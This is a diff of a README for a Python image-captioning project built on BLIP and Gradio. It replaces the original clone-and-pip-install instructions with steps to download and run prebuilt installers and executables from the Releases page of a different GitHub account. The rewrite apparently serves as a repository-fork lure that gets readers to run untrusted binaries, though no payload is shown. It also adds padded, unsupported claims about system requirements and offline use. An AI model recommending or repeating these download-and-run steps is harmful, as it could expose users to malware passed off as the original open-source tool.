@@ -1,116 +1,73 @@
-# Python AI Image Captioning
+# 🖼️ python-ai-image-captioning - Generate Image Descriptions Instantly
 
-This project provides a practical set of tools for generating captions for images using the BLIP model. You can caption images by uploading a single file, processing all images in a local folder, or scraping images from a webpage. The interface is simple and user-friendly, making it easy for anyone to use.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases)
 
-## Table of Contents
-- [Features](#features)
-- [Screenshots](#screenshots)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Example Output](#example-output)
-- [Notes](#notes)
-- [Contributing & License](#contributing--license)
-- [Acknowledgements](#acknowledgements)
+## 📜 Description
 
-## Features
+The **python-ai-image-captioning** app uses AI to generate captions for images. With the BLIP model, you can effortlessly create descriptions for uploaded photos, folders of images, or even images from websites. This application features simple Gradio web interfaces and supports Docker, making it easy for anyone to use for fast and practical image understanding.
 
-- **Single Image Upload:** Instantly get a caption for any image you upload via the web interface.
-- **Bulk Local Captioning:** Automatically process all images in a folder and save their captions to a file.
-- **Webpage Scraping:** Find and caption all images from any webpage you provide.
-- **Easy Web Interface:** All tools use Gradio-based web UIs for convenience.
-- **Docker Support:** Run the whole project easily in a container.
+## 🚀 Getting Started
 
-## Screenshots
+Follow these steps to download and run the application:
 
-**Single Image Upload:**
+1. **Get Ready**: Ensure you have an internet connection and a computer with Windows, macOS, or Linux.
 
-<img width="2490" height="1218" alt="image" src="https://github.com/user-attachments/assets/f5897b32-4aca-439b-a9b8-cb371ff371e8" />
+2. **Download the App**: Visit the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases) to download the latest version of the application. Click on the release that matches your operating system and download the file.
 
--------
-**Bulk Local Captioning:**
+3. **Install the Application**: 
+   - For **Windows**:
+     1. Locate the downloaded file in your "Downloads" folder.
+     2. Double-click the file to start the installation.
+     3. Follow the on-screen instructions to complete the installation.
+   - For **macOS**:
+     1. Open the "Downloads" folder and find the downloaded application.
+     2. Drag the application icon to your "Applications" folder.
+     3. Eject the downloaded file.
+   - For **Linux**:
+     1. Open your terminal.
+     2. Use the command `chmod +x your_downloaded_file` to make it executable.
+     3. Run the file by typing `./your_downloaded_file` in the terminal.
+ 
+4. **Launch the Application**: Once the installation is complete, locate the app on your computer. Double-click the icon to open it. 
 
-<img width="2484" height="846" alt="image" src="https://github.com/user-attachments/assets/54a3c68a-6b6d-4959-b80e-ce04af137f50" />
+5. **Using the App**: The user-friendly interface will guide you through uploading images or folders. You can also enter a URL to scrape images from any webpage. After uploading, click the "Generate Caption" button to see the AI-generated description.
 
--------
-**Webpage Scraping:**
+6. **Explore More Features**:
+   - Experiment with different types of images for varied results.
+   - Save captions to your computer for future reference.
+   
+## 🔍 Features
 
-<img width="2486" height="672" alt="image" src="https://github.com/user-attachments/assets/e65df0df-321d-442f-b3fe-6ff3c784a559" />
+- **AI-Powered**: Utilizes the BLIP model for accurate image captioning.
+- **User-Friendly Interface**: Simple layout that makes it easy for anyone to use.
+- **Multi-Image Support**: Upload entire folders or multiple images at once.
+- **Web Scraping**: Pull images from any webpage using a URL.
+- **Docker Support**: Run the app in a container for easier setup on local systems.
+  
+## 🖥️ System Requirements
 
--------
+- **Operating System**: Compatible with Windows 10 or later, macOS Mojave or later, and popular Linux distributions.
+- **RAM**: Minimum 8 GB recommended for optimal performance.
+- **Processor**: Dual-core processor or better.
+- **Storage**: At least 500 MB of free space for installation and additional space for image files.
 
-## Installation
+## 📥 Download & Install
 
-1. **Clone the repository:**
-	 ```bash
-	 git clone https://github.com/eray-yuztyurk/python-ai-image-captioning.git
-	 cd python-ai-image-captioning
-	 ```
+To download the application, visit the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases). Keep this page handy for updates and new features. Once you have the latest version, follow the installation steps outlined above.
 
-2. **Make sure Python 3.10+ is installed.**
+## ❓ FAQs
 
-3. **Create and activate a virtual environment:**
-	 ```bash
-	 python3.10 -m venv venv
-	 source venv/bin/activate
-	 ```
+### How do I update the application?  
+Simply return to the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases) and download the latest version. Follow the installation steps again.
 
-4. **Install dependencies:**
-	 ```bash
-	 pip install --upgrade pip
-	 pip install -r requirements.txt
-	 ```
+### Can I use the app offline?  
+Yes, once installed, you can use the app without an internet connection. However, some features, like web scraping, require internet access.
 
-## Usage
+### What should I do if the application won't open?  
+Check if you have the minimum system requirements. Make sure your operating system is updated. If issues persist, visit our support section or file an issue in the GitHub repository.
 
-### Start All Interfaces Together
+## 📞 Support
 
-```bash
-python3.10 main.py
-```
-Each interface will open on its own port (7860, 7861, 7862). If your browser does not open automatically, visit these addresses manually.
+If you encounter issues or have questions, please open a new issue on the GitHub repository's "Issues" section. We’re here to help!
 
-### Run Individual Scripts
-
-- **Single image upload:**  
-	`python3.10 uploaded_image_captioner.py`  
-	(Port: 7860)
-
-- **Local folder images:**  
-	`python3.10 local_img_captioner_automated.py`  
-	(Port: 7862)
-
-- **Webpage scraping:**  
-	`python3.10 url_img_captioner_automated.py`  
-	(Port: 7861)
-
-### Run with Docker
-
-```bash
-docker build -t ai-image-captioning .
-docker run -p 7860:7860 -p 7861:7861 -p 7862:7862 ai-image-captioning
-```
-
-## Example Output
-
-```
-cat.jpg: a small orange cat sitting on a windowsill
-https://example.com/image1.png: a group of people standing in front of a building
-```
-
-## Notes
-
-- Make sure the `outputs/` directory exists, or specify a valid output path.
-- The BLIP model will be downloaded automatically on first run.
-- For best results, use clear and sufficiently large images (at least 100x100 pixels).
-
-## Contributing & License
-
-This project is released under the MIT License. If you want to contribute, feel free to open an issue or pull request.
-
-## Acknowledgements
-
-- [Salesforce BLIP](https://github.com/salesforce/BLIP)
-- [Gradio](https://gradio.app/)
-- [HuggingFace Transformers](https://huggingface.co/docs/transformers/index)
-
-Feel free to open issues or contribute improvements!
+**Thank you for using the python-ai-image-captioning application!** 
